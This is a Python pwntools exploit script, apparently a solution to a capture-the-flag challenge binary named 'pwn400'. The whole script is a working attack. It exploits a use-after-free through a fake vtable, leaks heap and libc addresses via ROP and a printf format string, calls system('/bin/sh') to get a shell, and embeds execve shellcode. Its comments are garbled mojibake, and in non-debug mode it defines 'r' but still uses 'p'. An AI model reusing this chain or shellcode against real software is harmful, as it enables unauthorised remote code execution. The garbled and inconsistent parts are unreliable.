from pwn import *
from ctypes import *

####������Ҫ�ǿ�����uaf�����ܺ����ݴ��ûע�⣬����й¶���ѵ�ַ  ��һ��
####uaf���ԣ���decrypt���ͷŵ�ָ�벻��գ��Ӷ�commentʱ�γ�uaf��ͬʱ���ں���ָ��
####����ѭ��й¶��ַ�������ѣ���Ϊ�ڼ��ܼ�����ʱ�����ջ��ĳ��λ����check�����������������
####������й¶������������got����read��printf������ʹ��libc-database��й¶��system�ĵ�ַ
####���libc-database������һ�ѣ�������������

####��ʵ�������һ����������ָ�룬���Ի���Ҫ����gadget�����ƺ�������gadget�ڹ���ʱ�Լ�ɵ��
####һ��retǰҲ�����add rsp���Լ����Ҫע�⡣


DEBUG = 1
if DEBUG:
     p = process('./pwn400')
else:
     r = remote('172.16.4.93', 13025)


shellcode=""
shellcode += "\x31\xf6\x48\xbb\x2f\x62\x69\x6e"
shellcode += "\x2f\x2f\x73\x68\x56\x53\x54\x5f"
shellcode += "\x6a\x3b\x58\x31\xd2\x0f\x05"

print_plt=0x400be0
print_got=0x604018 
read_got=0x604040 

pp7=0x0000000000401245 #: add rsp, 0x28 ; pop rbx ; pop rbp ; ret
prdi_ret=0x0000000000402343# : pop rdi ; ret

offset___libc_start_main_ret = 0x21b45
offset_system = 0x00000000000414f0
offset_dup2 = 0x00000000000d9c60
offset_read = 0x00000000000d95b0
offset_write = 0x00000000000d9610
offset_str_bin_sh = 0x161160
offset_printf = 0x0000000000050d50



def pwn():
    #gdb.attach(p,"b *0x401FBA")
    ###part1  й¶���ѵ�ַ
    p.recvuntil('exit\n')
    p.send('1\n')
    
    p.recvuntil('No\n')
    p.send('1\n')
    p.recvuntil('p: \n')
    p.send('3\n')
    p.recvuntil('q: \n')
    p.send('5\n')

    p.recvuntil('exit\n')
    p.send('2\n')
    p.recvuntil('0x40)\n')
    p.send('64\n')
    p.recvuntil('text')
    p.send('a'*0x40)
    p.recvuntil('ciphertext: ')
    data=p.recvuntil('What')[:-5]
    data=data[512:]
    malloc_ptr=u64(data.ljust(8,'\x00'))
    print hex(malloc_ptr)
    p.recvuntil('exit\n')

    ###part2 decrypt������ͷŶѿ�
    p.send('3\n')
    p.recvuntil('encoded)')
    p.send('24\n')
    p.recvuntil('text\n')
    p.send('0n0000000n00000000000000\n')

    ###part2 comment������ѿ飬�Ӷ������麯��ָ��
    p.recvuntil('5. exit\n')
    p.send('4\n')
    p.recvuntil('RSA')
    fake_vtable_ptr=malloc_ptr-0x220
    format=malloc_ptr-0x258
    stri="%8$s".ljust(56,'c')
    data=p64(fake_vtable_ptr)+stri+8*p64(pp7)
    p.send(data+'\n')

    ####part4 ���öѿ飬printf����й¶��ַ
    p.recvuntil('exit\n')
    p.send('2\n')
    p.recvuntil('0x40)\n')
    p.send('64\n')
    p.recvuntil('text')
    data=p64(prdi_ret)+p64(format)+p64(print_plt)+p64(0x401D9D)+p64(print_got)*3
    data=data.ljust(64,'k')
    p.send(data)

    print_addr=u64(p.recvuntil('ccc')[1:-3].ljust(8,'\x00'))
    print "printf addr",hex(print_addr)

    ####part5 libc-database �����ĵ�ַ�����õ�system������ַ
    libc_base=print_addr-offset_printf
    system_addr=libc_base+offset_system
    binsh_addr=libc_base+offset_str_bin_sh

    ###part6  ���öѿ飬ִ��system�������õ�shell
    p.recvuntil('exit\n')
    p.send('2\n')
    #print p.recv()
    p.recvuntil('0x40)\n')
    print "123"
    p.send('64\n')
    p.recvuntil('text')
    data=p64(0x0000000000400bc1)+p64(prdi_ret)+p64(binsh_addr)+p64(system_addr)
    data=data.ljust(64,'k')
    p.send(data)
    
    p.interactive()



if __name__ == '__main__':
   pwn()

